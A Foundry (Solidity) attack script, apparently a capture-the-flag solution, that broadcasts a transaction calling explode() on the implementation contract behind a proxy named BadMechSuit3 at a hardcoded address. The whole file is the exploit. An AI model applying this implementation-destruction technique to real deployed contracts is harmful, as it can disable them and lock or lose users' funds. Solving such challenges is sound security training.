// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackBadMechSuit3 is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        BadMechSuit3 target = BadMechSuit3(
            0xDF7C3dfd533e2Ec6c48a357E820fd59Ad2bb46Ed
        );
        SuitLogic impl = SuitLogic(target.impl());
        vm.startBroadcast(privateKey);
        impl.explode{value: 1 wei}();
        // target.shootFire(); // Note simulation is not enough here to get a failure in a simulated run, this should be done in 2 steps
        vm.stopBroadcast();
    }
}

interface BadMechSuit3 {
    function impl() external view returns (address);

    function shootFire() external pure returns (bytes32);
}

interface SuitLogic {
    function explode() external payable;
}
